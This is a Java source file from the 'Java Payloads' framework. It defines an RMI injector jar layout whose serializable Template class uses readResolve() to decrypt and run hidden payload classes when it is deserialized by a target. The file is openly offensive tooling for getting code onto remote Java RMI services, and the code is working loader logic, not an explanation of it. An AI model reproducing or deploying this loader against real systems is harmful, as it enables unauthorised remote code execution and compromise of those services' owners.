/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.crypter;

import java.io.ObjectStreamException;
import java.io.Serializable;
import java.util.jar.Manifest;

import javapayload.Parameter;

public class RMI extends TemplateBasedJarLayout {

	public RMI() {
		super("RMI Injector Jar", Template.class,
				"Use this jar layout with Jar files used with RMI injector");
	}

	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("LOADERCLASS", false, Parameter.TYPE_ANY, "Loader class name"),
				new Parameter("NEWLOADERCLASS", false, Parameter.TYPE_ANY, "New loader class name"),
		};
	}

	public void init(String[] parameters, Manifest manifest) throws Exception {
		targetClassName = parameters[0];
		stubClassName = parameters[1];
	}

	public static class Template implements Serializable {
		public byte[][] classes;
		public Object[] parameters;

		public transient Class target;

		public Object readResolve() throws ObjectStreamException {
			try {
				TemplateBasedJarLayout.cryptedMain(new String[] { "TARGET_CLASS_NAME", "STUB_CLASS_NAME", "target" });
				Object realTemplate = target.newInstance();
				target.getField("classes").set(realTemplate, classes);
				target.getField("parameters").set(realTemplate, parameters);
				target.getDeclaredMethod("go", new Class[0]).invoke(realTemplate, new Object[0]);
			} catch (Throwable t) {
				/* #JDK1.4 */try {
					throw new RuntimeException(t);
				} catch (NoSuchMethodError ex) /**/{
					throw new RuntimeException(t.toString());
				}
			}
			return null;
		}
	}
}
